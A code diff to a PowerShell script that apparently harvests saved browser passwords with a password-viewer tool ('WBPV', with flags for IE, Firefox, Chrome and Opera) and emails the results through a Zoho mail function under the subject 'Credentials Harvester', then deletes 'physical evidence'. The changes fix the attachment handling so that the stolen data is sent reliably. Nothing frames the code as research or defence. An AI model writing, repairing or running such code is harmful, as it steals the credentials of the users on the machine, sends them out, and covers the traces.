@@ -45,19 +45,20 @@ function Send-ZohoEmail {
     $mailMessage.Subject = $Subject
     $mailMessage.Body = $Body
 
-    # Attach logic updated to handle both Paths and MemoryStream Objects
+    # Attach logic updated to be more "forgiving"
     foreach ($item in $Attachments) {
-        if ($item -is [System.Net.Mail.Attachment]) {
-            # It's already a MemoryStream attachment object, just add it
+        # Check if it's already an Attachment object
+        if ($item.GetType().FullName -eq "System.Net.Mail.Attachment") {
             $mailMessage.Attachments.Add($item)
         }
+        # Check if it's a valid file path string
         elseif ($item -is [string] -and (Test-Path $item)) {
-            # It's a physical file path, create a new attachment object
             $attachment = New-Object System.Net.Mail.Attachment($item)
             $mailMessage.Attachments.Add($attachment)
         } 
         else {
-            Write-Host "Warning: Invalid attachment or file not found - $item" -ForegroundColor Yellow
+            # This is where your error is currently triggering
+            Write-Host "Warning: Invalid attachment or file not found - $($item.GetType().Name)" -ForegroundColor Yellow
         }
     }
 
@@ -84,18 +85,6 @@ function Send-ZohoEmail {
     }
 }
 
-# 1. Define the executable path
-# $exe = "$env:TEMP\example.exe"
-
-# 2. Run the tool with full browser flags
-# We use /stext "" to try and force output to the console, 
-# but if that build is restricted, we use a temporary variable file.
-# $tempFile = "$env:TEMP\tmp.txt"
-
-# Execute with all browsers enabled (1 = Yes)
-# & $exe /LoadPasswordsIE 1 /LoadPasswordsFirefox 1 /LoadPasswordsChrome 1 /LoadPasswordsOpera 1 /stext $tempFile
-
-# 3. Read the file into RAM and IMMEDIATELY delete the file
 
 
 # Run WBPV 
@@ -157,7 +146,9 @@ if (Test-Path $outputFilePath) {
     # 5. Send Email Logic here...
     $subject = "$env:USERNAME: Credentials Harvester - Sent on $currentDateTime"
     $attachments = @($attachment)  # Array of attachment file paths
-    Send-ZohoEmail -Subject $subject -Attachments $attachments # Send the email
+
+    # Use @() to ensure it stays an array of objects
+    Send-ZohoEmail -Subject $subject -Attachments @($attachment)
 
     
     # 6. Cleanup physical evidence
